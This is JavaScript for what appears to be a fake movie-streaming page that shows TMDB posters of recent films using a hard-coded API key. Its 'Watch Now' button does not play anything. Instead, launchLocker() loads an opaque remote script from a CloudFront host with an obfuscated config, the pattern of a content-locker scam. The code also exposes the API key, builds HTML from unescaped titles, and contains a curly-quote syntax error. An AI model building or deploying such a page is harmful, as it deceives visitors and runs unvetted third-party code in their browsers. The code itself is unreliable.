const apiKey = '39baaaf0ddc6b42b7cd1db757f91efdb';
const movieTitles = [
  “Up” , "Lilo & Stitch (2025)","Mission: Impossible – The Final Reckoning","HIT: The Third Case","The Prosecutor",
    "Shadow Force","The King of Kings","Karate Kid: Legends","Lost in Starlight","Eleanor the Great"
    ,"Honey Don’t!","Dune: Part Two", "Godzilla x Kong: The New Empire", "Civil War", "Furiosa: A Mad Max Saga",
      "The Fall Guy", "Kung Fu Panda 4", "The Ministry of Ungentlemanly Warfare", "Poor Things",
      "Wonka", "Napoleon", "Avatar: The Way of Water", "John Wick: Chapter 4", "The Batman",
      "The Flash", "Spider-Man: Across the Spider-Verse", "Mission: Impossible – Dead Reckoning",
      "The Marvels", "The Hunger Games: The Ballad of Songbirds and Snakes",
      "Transformers: Rise of the Beasts", "Guardians of the Galaxy Vol. 3", "Fast X", "Elemental",
      "The Little Mermaid", "Oppenheimer", "Barbie", "Trolls Band Together", "Wish",
      "Killers of the Flower Moon", "The Creator", "Saltburn", "Aquaman and the Lost Kingdom",
      "Five Nights at Freddy's", "The Equalizer 3", "The Exorcist: Believer", "Blue Beetle",
      "The Super Mario Bros. Movie", "Scream VI", "Haunted Mansion", "The Nun II",
      "Meg 2: The Trench", "A Haunting in Venice", "Indiana Jones and the Dial of Destiny",
      "The Whale", "Air", "The Covenant", "Extraction 2", "Leave the World Behind",
      "No Hard Feelings", "The Killer", "The Holdovers", "Kill Boksoon", "Past Lives",
      "The Bikeriders", "The Marvels",  "Oppenheimer", "Killers of the Flower Moon"
];

const movies = [];

function fetchMoviesFromTMDB() {
  const promises = movieTitles.map(title => {
    return fetch(`https://api.themoviedb.org/3/search/movie?api_key=${apiKey}&query=${encodeURIComponent(title)}`)
      .then(res => res.json())
      .then(data => {
        if (data.results && data.results.length > 0) {
          const m = data.results[0];
          movies.push({
            title: m.title,
            year: m.release_date ? m.release_date.split("-")[0] : "N/A",
            genre: "Movie",
            img: m.poster_path ? `https://image.tmdb.org/t/p/w300${m.poster_path}` : ""
          });
        }
      });
  });

  Promise.all(promises).then(() => renderMovies());
}

function renderMovies(filter = "") {
  const grid = document.getElementById("movieGrid");
  grid.innerHTML = "";
  const filtered = movies.filter(m => m.title.toLowerCase().includes(filter.toLowerCase()));
  for (const movie of filtered) {
    grid.innerHTML += `
      <div class="movie-card">
        <img src="${movie.img}" alt="Poster of ${movie.title}">
        <div class="movie-info">
          <div class="movie-title">${movie.title}</div>
          <div class="movie-meta">${movie.year} • ${movie.genre} • HD</div>
          <button class="watch-btn" onclick="launchLocker('${movie.title}')">Watch Now</button>
        </div>
      </div>
    `;
  }
}

function searchMovies() {
  const query = document.getElementById("searchInput").value;
  renderMovies(query);
}

function launchLocker(title) {
  const lockerScript = document.createElement("script");
  lockerScript.type = "text/javascript";
  lockerScript.src = "https://dlk457skl57zp.cloudfront.net/87f7be5.js";
  lockerScript.onload = function () {
    window.MfMZH_wbN_CLGGPc = { "it": 4504423, "key": "7d80d" };
    if (typeof _Tt === "function") {
      _Tt();
    } else {
      console.warn("Locker function _Tt not found.");
    }
  };
  document.body.appendChild(lockerScript);
}

fetchMoviesFromTMDB();
